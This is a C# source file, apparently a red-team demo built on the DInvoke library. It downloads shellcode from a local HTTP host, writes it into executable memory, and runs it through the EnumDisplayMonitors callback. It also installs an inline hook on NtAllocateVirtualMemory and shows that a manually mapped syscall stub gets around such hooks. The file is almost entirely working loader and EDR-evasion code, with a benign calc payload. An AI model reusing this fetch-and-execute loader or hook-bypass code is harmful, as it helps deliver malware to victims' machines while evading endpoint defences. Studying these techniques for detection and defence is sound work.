using DInvoke.Data;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DInvoke.DynamicInvoke;
using System.Net;
using static DInvoke.ManualMap.Program;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace DInvoke.ManualMap
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DVirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr EnumDisplayMonitors(
            IntPtr hdc,
            IntPtr lprcClip,
            IntPtr lpfnEnum,
            IntPtr dwData);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            UInt32 AllocationType,
            UInt32 Protect
        );
        public static void Main()
        {
            //ManualMapDemo();
            SyscallStubDemo();
        }
        public static void SyscallStubDemo()
        {
            // Grabbing ntdll + NtAllocateVirtualMemory address 
            IntPtr ntdll = default;
            foreach (ProcessModule mod in Process.GetCurrentProcess().Modules)
            {
                if (mod.ModuleName.ToLower() == "ntdll.dll")
                    ntdll = mod.BaseAddress;
            }
            IntPtr pOGAlloc = Generic.GetExportAddress(ntdll, "NtAllocateVirtualMemory");

            // Mapping a syscall stub for ntallocateVirtualmemory
            IntPtr pStub = Map.GetSyscallStub("NtAllocateVirtualMemory");
            Console.WriteLine("Stub is mapped at 0x{0:X}", (long)pStub);
            Console.ReadKey();

            object[] allocArgs = { 
                (IntPtr)(-1), 
                IntPtr.Zero, 
                IntPtr.Zero, 
                (IntPtr)2048, 
                (UInt32)0x3000, 
                (UInt32)0x420 
            };

            // Why do i have to jit the hook now??
            MethodInfo method = typeof(Program).GetMethod(nameof(NtAllocateVirtualMemoryHook), BindingFlags.Static | BindingFlags.Public);
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            using (FxHook hook = new FxHook(pOGAlloc, (NtAllocateVirtualMemory)NtAllocateVirtualMemoryHook))
            {
                hook.Install();

                // Calling the ntallocate from ntdll, which is hooked
                uint ntstatus = (uint)Generic.DynamicFunctionInvoke(
                    pOGAlloc,
                    typeof(NtAllocateVirtualMemory),
                    ref allocArgs
                );
                Console.WriteLine("Ntstatus was 0x{0:X}", (long)ntstatus);
                Console.WriteLine("Allocated to 0x{0:X}", (long)(IntPtr)allocArgs[1]);

                Console.ReadKey();

                // Calling the ntallocate from getsyscallstub
                allocArgs = new object[] { (IntPtr)(-1), IntPtr.Zero, IntPtr.Zero, (IntPtr)2048,  (UInt32)0x3000, (UInt32)0x40 };
                ntstatus = (uint)Generic.DynamicFunctionInvoke(
                    pStub,
                    typeof(NtAllocateVirtualMemory),
                    ref allocArgs
                );
                Console.WriteLine("Ntstatus was 0x{0:X}", (long)ntstatus);
                Console.WriteLine("Allocated to 0x{0:X}", (long)(IntPtr)allocArgs[1]);

                Console.ReadKey();
            }
 
        }
        public static void ManualMapDemo()
        {
            IntPtr user32 = default;
            foreach (ProcessModule mod in Process.GetCurrentProcess().Modules)
            {
                if (mod.ModuleName.ToLower() == "user32.dll")
                    user32 = mod.BaseAddress;
            }
            IntPtr pOGEnum = Generic.GetExportAddress(user32, "EnumDisplayMonitors");


            byte[] buf = new WebClient().DownloadData("http://192.168.1.106:8000/calc.bin");
            object[] args = { IntPtr.Zero, (uint)buf.Length, (uint)0x3000, (uint)0x40 };
            IntPtr handle = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "VirtualAlloc", typeof(DVirtualAlloc), ref args);

            Marshal.Copy(buf, 0, handle, buf.Length);

            using (FxHook hook = new FxHook(pOGEnum, (EnumDisplayMonitors)EnumDisplayMonitorsHook))
            {
                hook.Install();

                object[] enumArgs = new object[] { IntPtr.Zero, IntPtr.Zero, handle, IntPtr.Zero };
                Generic.DynamicApiInvoke("user32.dll", "EnumDisplayMonitors", typeof(EnumDisplayMonitors), ref enumArgs);

                Console.ReadKey();

                PE.PE_MANUAL_MAP User32Info = Map.MapModuleToMemory("C:\\Windows\\system32\\user32.dll");
                Generic.CallMappedDLLModuleExport(User32Info.PEINFO, User32Info.ModuleBase, "EnumDisplayMonitors", typeof(EnumDisplayMonitors), enumArgs, false);


            }
        }
        public static IntPtr EnumDisplayMonitorsHook(IntPtr hdc, IntPtr lprcClip, IntPtr lpfnEnum, IntPtr dwData)
        {
            Console.WriteLine("You called hooked EnumDisplayMonitors!");
            return IntPtr.Zero;
        }
        public static uint NtAllocateVirtualMemoryHook(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
        {
            if (Protect == 0x420)
            {
                Console.WriteLine("Why did you pass 0x420 as the protection? Im returned code 0x6969");
                return (uint)0x6969;
            }
            Marshal.Copy(FxHook.src, 0, FxHook.addr, FxHook.nBytes); // temporarily remove hook
            object[] args = { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };
            uint retVal = (uint)Marshal.GetDelegateForFunctionPointer(FxHook.addr, typeof(NtAllocateVirtualMemory)).DynamicInvoke(args);
            Marshal.Copy(FxHook.dst, 0, FxHook.addr, FxHook.nBytes); // restore hook
            BaseAddress = (IntPtr)args[1];
            RegionSize = (IntPtr)args[3];
            return retVal;
        }
    }
    public class FxHook : IDisposable
    {

        public const int nBytes = 13;
        // movabs r11, address
        // jmp r11

        public static IntPtr addr; // the function we are hooking
        Protection old;
        public static byte[] src = new byte[13]; //source bytes
        public static byte[] dst = new byte[13]; //trampoline

        public FxHook(IntPtr source, IntPtr destination)
        {
            VirtualProtect(source, nBytes, Protection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(source, src, 0, nBytes); //copy the original 13 we will patch
            dst[0] = 0x49;
            dst[1] = 0XBB;
            var dx = BitConverter.GetBytes((long)destination);
            Array.Copy(dx, 0, dst, 2, 8);
            dst[10] = 0x41;
            dst[11] = 0xFF;
            dst[12] = 0xE3;
            addr = source;
        }
        public FxHook(IntPtr source, Delegate destination) :
            this(source, Marshal.GetFunctionPointerForDelegate(destination))
        {
        }

        public void Install()
        {
            Marshal.Copy(dst, 0, addr, nBytes);
        }

        public void Uninstall()
        {
            Marshal.Copy(src, 0, addr, nBytes);
        }

        public void Dispose()
        {
            Uninstall();
            Protection x;
            VirtualProtect(addr, nBytes, old, out x);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            Protection flNewProtect, out Protection lpflOldProtect);

        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }
    }
}